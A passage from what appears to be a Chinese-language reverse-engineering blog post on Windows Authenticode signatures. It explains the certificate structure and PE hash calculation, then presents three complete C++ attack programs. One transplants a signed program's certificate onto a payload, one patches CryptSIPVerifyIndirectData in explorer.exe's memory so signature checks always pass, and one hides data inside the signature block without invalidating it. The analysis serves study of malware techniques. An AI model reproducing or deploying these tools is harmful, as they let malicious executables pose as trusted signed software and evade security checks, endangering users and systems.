</span>&#123;</span><br><span class="line">    BOOL bResult;</span><br><span class="line">    WCHAR* SupportedExtensions[<span class="number">7</span>];</span><br><span class="line">    WCHAR* Extension;</span><br><span class="line">    GUID PowerShellSIPGUID = CRYPT_SUBJTYPE_POWERSHELL_IMAGE;</span><br><span class="line">    SupportedExtensions[<span class="number">0</span>] = <span class="string">L&quot;ps1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">1</span>] = <span class="string">L&quot;ps1xml&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">2</span>] = <span class="string">L&quot;psc1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">3</span>] = <span class="string">L&quot;psd1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">4</span>] = <span class="string">L&quot;psm1&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">5</span>] = <span class="string">L&quot;cdxml&quot;</span>;</span><br><span class="line">    SupportedExtensions[<span class="number">6</span>] = <span class="string">L&quot;mof&quot;</span>;</span><br><span class="line">    bResult = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (pwszFileName &amp;&amp; pgSubject) &#123;</span><br><span class="line">        Extension = <span class="built_in">wcsrchr</span>(pwszFileName, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Extension) &#123;</span><br><span class="line">            Extension++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">                <span class="keyword">if</span> (!_wcsicmp(Extension, SupportedExtensions[i])) &#123;</span><br><span class="line">                    bResult = TRUE;</span><br><span class="line">                    <span class="built_in">memcpy</span>(pgSubject, &amp;PowerShellSIPGUID, <span class="built_in">sizeof</span>(GUID));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">SetLastError</span>(ERROR_INVALID_PARAMETER);</span><br><span class="line">    <span class="keyword">return</span> bResult;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于查看数位签名在PE档案中的位置，可用PE Bear。看到Data Directory表，有Security Directory栏位之位址是一个Offset位置，指向嵌入式Authenticode签名讯息，为WIN_CERTIFICATE结构。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WIN_CERTIFICATE</span> &#123;</span><br><span class="line">	DWORD dwLength;</span><br><span class="line">	WORD  wRevision;</span><br><span class="line">	WORD  wCertificateType;</span><br><span class="line">	BYTE  bCertificate[ANYSIZE_ARRAY];</span><br><span class="line">&#125; WIN_CERTIFICATE, * LPWIN_CERTIFICATE;</span><br></pre></td></tr></table></figure>

<p>dwLength记录以签名讯息资料起点处之后多少字节内部算是签名讯息资料。bCertificate栏位作为起点开始后所有资料都是校验用的证书记录内容。wCertificateType栏位记录bCertificate证书类型，选项如下。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>WIN_CERT_TYPE_X509</td>
<td>X.509证书</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_PKCS_SIGNED_DATA</td>
<td>PKCS#7方式填充的SignedData的结构</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_RESERVED_1</td>
<td>保留</td>
</tr>
<tr>
<td>WIN_CERT_TYPE_TS_STACK_SIGNED</td>
<td>伺服器协议堆叠证书签名</td>
</tr>
</tbody></table>
<p>对于wRevision栏位值为WIN_CERT_REVISION_1_0代表旧版Win_Certificate，WIN_CERT_REVISION_2_0代表当代版本。证书签名资讯细节与档案指纹计算细节有<a target="_blank" rel="noopener" href="https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx%EF%BC%8C%E4%BD%86%E8%BF%99%E4%B8%AA%E6%9C%89%E5%A4%9A%E5%B0%91%E8%BF%87%E6%97%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%88%91%E4%B8%8D%E5%A5%BD%E8%AF%B4%E3%80%82">https://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx，但这个有多少过时的内容我不好说。</a></p>
<p>签名讯息被拼接在政支PE静态档案内容结尾，即最后一个区段内容末尾，拼接起点为Secruity Directory所记录的Offset位址。在遵守PCKS#7方式填充的签名证书讯息，内文包含：</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>contentInfo</td>
<td>记录签名当下该档案杂凑值作为指纹</td>
</tr>
<tr>
<td>certificates</td>
<td>记录签署人的X.509公开证书资讯</td>
</tr>
<tr>
<td>signerInfos</td>
<td>储存contentInfo杂凑值与用来显示给使用者检视签署人资讯，如签署人名称、参考网址、签署时间等</td>
</tr>
</tbody></table>
<p>档案指纹（即杂凑）的计算方法：</p>
<ol>
<li>将PE程式档案读入到记忆体中，并对杂凑演算法做必要的初始化。</li>
<li>将PE档案开头处到Checksum栏位（位于NT Headers之Optional Header结构）之前的资料进行杂凑计算并更新杂凑结果。</li>
<li>跳过Checksum栏位不做杂凑计算。</li>
<li>将Checksum栏位末端到Security Directory栏位之前的资料进行杂凑计算并更新杂凑结果。</li>
<li>跳过Security Directory栏位，即一个8字节IMAGE_DATA_DIRECTORY结构大小不做杂凑计算。</li>
<li>将Security Directory栏位末端开始到区段头阵列结尾的资料进行杂凑计算并更新杂凑结果。</li>
<li>宣告一个数值变数SUM_OF_BYTES_HASHED用以储存当前已对多少字节做过杂凑计算，接着将其预设值设为SizeOfHeaders数值。</li>
<li>建立一个区段头清单储存PE结构中的所有区段头资讯，并将清单中各个区段头按照其结构的PointrToRawData以小到大的升幂排序。</li>
<li>对已排序清单中每个区段头按顺序枚举、对区段头指向内容进行块状杂凑计算并更新杂凑结果，每杂凑完一个区段内容便将SUM_OF_BYTES_HASHED变数加上该区段内容大小。</li>
<li>此时Authenticode被储存在PE机构最末端，但若签名讯息后端还被多padding了其他资料，则将签名讯息块状结构后至档案EOF处所有多余资料再计算一次杂凑并更新杂凑结果。</li>
</ol>
<p>签名伪造，即将他人Authenticode签名讯息偷过来在恶意程式上。下面这个代码可简单将一个已签名的程式的数位签名直接拷贝到另一个程式上，此时签名是无效的，注意x86与x64要对应。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="function">PBYTE <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">	FILE* fileptr;</span><br><span class="line">	PBYTE buffer;</span><br><span class="line">	fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>); <span class="comment">// Open the file in binary mode</span></span><br><span class="line">	<span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);	 <span class="comment">// Jump to the end of the file</span></span><br><span class="line">	filelen = <span class="built_in">ftell</span>(fileptr);		 <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">	<span class="built_in">rewind</span>(fileptr);				 <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">	buffer = (PBYTE)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">	<span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr);					   <span class="comment">// Read in the entire file</span></span><br><span class="line">	<span class="built_in">fclose</span>(fileptr);									   <span class="comment">// Close the file</span></span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">PBYTE <span class="title">rippedCert</span><span class="params">(CONST PCHAR fromWhere, LONGLONG&amp; certSize)</span> </span>&#123;</span><br><span class="line">	LONGLONG signedPeDataLen = <span class="number">0</span>;</span><br><span class="line">	PBYTE signedPeData = <span class="built_in">MapFileToMemory</span>(fromWhere, signedPeDataLen);</span><br><span class="line">	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;signedPeData[<span class="built_in">PIMAGE_DOS_HEADER</span>(signedPeData)-&gt;e_lfanew]);</span><br><span class="line">	IMAGE_DATA_DIRECTORY certInfo = ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">	certSize = certInfo.Size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, certSize);</span><br><span class="line">	PBYTE certData = <span class="keyword">new</span> BYTE[certInfo.Size];</span><br><span class="line">	<span class="built_in">memcpy</span>(certData, &amp;signedPeData[certInfo.VirtualAddress], certInfo.Size);</span><br><span class="line">	<span class="keyword">return</span> certData;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">		PCHAR fileName = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) ? <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span> : argv[<span class="number">0</span>];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s [path/to/signed_pe] [path/to/payload] [path/to/output]\n&quot;</span>, fileName);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// signature from where?</span></span><br><span class="line">	LONGLONG certSize;</span><br><span class="line">	PBYTE certData = <span class="built_in">rippedCert</span>(argv[<span class="number">1</span>], certSize);</span><br><span class="line">	<span class="comment">// payload data prepare.</span></span><br><span class="line">	LONGLONG payloadSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE payloadPeData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">2</span>], payloadSize);</span><br><span class="line">	<span class="comment">// append signature to payload.</span></span><br><span class="line">	PBYTE finalPeData = <span class="keyword">new</span> BYTE[payloadSize + certSize];</span><br><span class="line">	<span class="built_in">memcpy</span>(finalPeData, payloadPeData, payloadSize);</span><br><span class="line">	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;finalPeData[<span class="built_in">PIMAGE_DOS_HEADER</span>(finalPeData)-&gt;e_lfanew]);</span><br><span class="line">	ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;</span><br><span class="line">	ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;finalPeData[payloadSize], certData, certSize);</span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(argv[<span class="number">3</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="built_in">fwrite</span>(finalPeData, payloadSize + certSize, <span class="number">1</span>, fp);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>勒索软体佩提亚Petya在野攻击行动被卡巴斯基研究员@craiu于2017年观察到，其特色在于使用重大国家外泄军火（如EternalBlue、SMB漏洞与Office相关漏洞进行钓鱼）作为标配感染途径，并在全球肆虐攻击大型政府与民营机关如机场、地铁与银行。Petya为了让后门更难以被用户察觉而采用了以上签名窃取手段，使其后门伪装成微软发布的执行程式混淆视听。</p>
<h3 id="杂凑校验绕过"><a href="#杂凑校验绕过" class="headerlink" title="杂凑校验绕过"></a>杂凑校验绕过</h3><p>受数位签名的执行程式档案透过<code>CryptSIPGetSignedDataMsg</code>提取出签名讯息（即Security Directory指向的那块WIN_CERTIFICATE完整结构内容）之后，便能以<code>CryptSIPVerifyIndirectData</code>进行校验其签名讯息有效性。若其数位签名对当前程式档案内容仍有效将返回TRUE，反之FALSE。本小节目标为伪造<code>CryptSIPVerifyIndirectData</code>，任何呼叫该函数进行签名有效性确认时都回应TRUE。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="type">bool</span> patchedDone = <span class="literal">false</span>;</span><br><span class="line"><span class="type">char</span> tmpModName[MAX_PATH], * pfnCryptVerifyData;</span><br><span class="line"><span class="comment">/* 32bit mode</span></span><br><span class="line"><span class="comment"> *     +0x00 - 48       - dec eax</span></span><br><span class="line"><span class="comment"> *     +0x01 - 31 C0    - xor eax, eax</span></span><br><span class="line"><span class="comment"> *     +0x03 - FE C0    - inc  al</span></span><br><span class="line"><span class="comment"> *     +0x05 - C3       - ret</span></span><br><span class="line"><span class="comment"> * 64bit mode</span></span><br><span class="line"><span class="comment"> *     +0x00 - 48 31 C0 - xor rax, rax</span></span><br><span class="line"><span class="comment"> *     +0x03 - FE C0    - inc al</span></span><br><span class="line"><span class="comment"> *     +0x05 - C3       - ret</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> x96payload[] = &#123; <span class="string">&quot;\x48\x31\xC0\xFE\xC0\xC3&quot;</span> &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	pfnCryptVerifyData = (PCHAR)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Crypt32&quot;</span>), <span class="string">&quot;CryptSIPVerifyIndirectData&quot;</span>);</span><br><span class="line">	<span class="built_in">EnumWindows</span>([](HWND hWnd, LPARAM lParam) -&gt; BOOL &#123;</span><br><span class="line">		DWORD processId = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;processId);</span><br><span class="line">		<span class="keyword">if</span> (HANDLE hProc = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, processId)) &#123;</span><br><span class="line">			<span class="built_in">GetModuleFileNameExA</span>(hProc, <span class="literal">NULL</span>, tmpModName, <span class="built_in">sizeof</span>(tmpModName));</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">stricmp</span>(tmpModName, <span class="string">&quot;C:\\Windows\\explorer.exe&quot;</span>))</span><br><span class="line">				patchedDone |= <span class="built_in">WriteProcessMemory</span>(hProc, pfnCryptVerifyData, x96payload, <span class="built_in">sizeof</span>(x96payload), <span class="literal">NULL</span>);</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(patchedDone ? <span class="string">&quot;[+] Sign Verify Patch for Explorer.exe Done.&quot;</span> : <span class="string">&quot;[!] Explorer.exe Alive yet?&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>本程序运行后将explorer.exe的<code>CryptSIPVerifyIndirectData</code>进行patch，直接返回TRUE，然后从explorer.exe文件属性中校验签名，发现签名正常。</p>
<h3 id="签名扩展攻击"><a href="#签名扩展攻击" class="headerlink" title="签名扩展攻击"></a>签名扩展攻击</h3><p>上个小节只是欺骗，本小节尝试从计算流程中找缺陷来绕过签名验证。</p>
<p>在杂凑计算流程中避开有：会因为植入签名讯息而异动的Checksum校验和、用于事后填写用的Secruity Directoy栏位、与签名讯息块本身结构。由于签名讯息本身不能被作为指纹杂凑计算流程的范畴、而受签名且其签署有效的程式档案又被Windows信任体系（如防毒厂商或系统自带白名单防护）视为安全无误的资料。于是选择在签名讯息块中藏匿任何恶意档案或资料，又不破坏签名有效性。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinTrust.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="function">PBYTE <span class="title">MapFileToMemory</span><span class="params">(LPCSTR filename, LONGLONG&amp; filelen)</span> </span>&#123;</span><br><span class="line">	FILE *fileptr;</span><br><span class="line">	PBYTE buffer;</span><br><span class="line">	fileptr = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>); <span class="comment">// Open the file in binary mode</span></span><br><span class="line">	<span class="built_in">fseek</span>(fileptr, <span class="number">0</span>, SEEK_END);	 <span class="comment">// Jump to the end of the file</span></span><br><span class="line">	filelen = <span class="built_in">ftell</span>(fileptr);		 <span class="comment">// Get the current byte offset in the file</span></span><br><span class="line">	<span class="built_in">rewind</span>(fileptr);				 <span class="comment">// Jump back to the beginning of the file</span></span><br><span class="line">	buffer = (PBYTE)<span class="built_in">malloc</span>((filelen + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="type">char</span>)); <span class="comment">// Enough memory for file + \0</span></span><br><span class="line">	<span class="built_in">fread</span>(buffer, filelen, <span class="number">1</span>, fileptr);					   <span class="comment">// Read in the entire file</span></span><br><span class="line">	<span class="built_in">fclose</span>(fileptr);									   <span class="comment">// Close the file</span></span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		PCHAR fileName = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) ? <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span> : argv[<span class="number">0</span>];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s [path/to/signed_pe] [file/to/append] [path/to/output]\n&quot;</span>, fileName); <span class="comment">//具数位签名的程式档案 欲藏匿的资料档案 输出程式档案</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">// read signed pe file &amp; payload</span></span><br><span class="line">	LONGLONG signedPeDataLen = <span class="number">0</span>, payloadSize = <span class="number">0</span>;</span><br><span class="line">	PBYTE signedPeData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">1</span>], signedPeDataLen), payloadData = <span class="built_in">MapFileToMemory</span>(argv[<span class="number">2</span>], payloadSize);</span><br><span class="line">	<span class="comment">// prepare space for output pe file.</span></span><br><span class="line">	PBYTE outputPeData = <span class="keyword">new</span> BYTE[signedPeDataLen + payloadSize];</span><br><span class="line">	<span class="built_in">memcpy</span>(outputPeData, signedPeData, signedPeDataLen);</span><br><span class="line">	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(&amp;outputPeData[((PIMAGE_DOS_HEADER)(outputPeData))-&gt;e_lfanew]);</span><br><span class="line">	PIMAGE_DATA_DIRECTORY certInfo = &amp;ntHdr-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];</span><br><span class="line">	<span class="comment">// append payload into certificate</span></span><br><span class="line">	LPWIN_CERTIFICATE certData = (LPWIN_CERTIFICATE)(&amp;outputPeData[certInfo-&gt;VirtualAddress]);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;<span class="built_in">PCHAR</span>(certData)[certData-&gt;dwLength], payloadData, payloadSize);</span><br><span class="line">	certInfo-&gt;Size = (certData-&gt;dwLength += payloadSize);</span><br><span class="line">	<span class="comment">// flush pe data back to file</span></span><br><span class="line">	<span class="built_in">fwrite</span>(outputPeData, <span class="number">1</span>, signedPeDataLen + payloadSize, <span class="built_in">fopen</span>(argv[<span class="number">3</span>], <span class="string">&quot;wb&quot;</span>));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://monoceros406.github.io">Monoceros406</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/">https://monoceros406.github.io/2024/10/16/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://monoceros406.github.io" target="_blank">The Blog of Monoceros406</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/20/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2-%E5%AE%9E%E6%88%98%E5%9F%BA%E7%A1%80/" title="硬件安全初探-实战基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">硬件安全初探-实战基础</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/16/Windows%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2-WinDBG%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/" title="Windows软件调试初探-WinDBG命令入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Windows软件调试初探-WinDBG命令入门</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/16/Angr%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="Angr做题笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-16</div><div class="title">Angr做题笔记</div></div></a></div><div><a href="/2023/10/29/Angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%AC%94%E8%AE%B0/" title="Angr符号执行笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-29</div><div class="title">Angr符号执行笔记</div></div></a></div><div><a href="/2024/01/13/Artfuscator%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="Artfuscator使用方法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-13</div><div class="title">Artfuscator使用方法</div></div></a></div><div><a href="/2023/11/09/C-%E7%97%85%E6%AF%92%E6%8A%80%E6%9C%AF/" title="C++病毒技术"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-09</div><div class="title">C++病毒技术</div></div></a></div><div><a href="/2024/03/10/C-%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B/" title="C#逆向常见题型"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-10</div><div class="title">C#逆向常见题型</div></div></a></div><div><a href="/2024/01/28/CheatEngine%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" title="CheatEngine基本操作"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-28</div><div class="title">CheatEngine基本操作</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Monoceros406</div><div class="author-info__description">智邮普创工作室安全组（退役）/Nepnep联合战队</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">293</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Monoceros406"><i class="fab 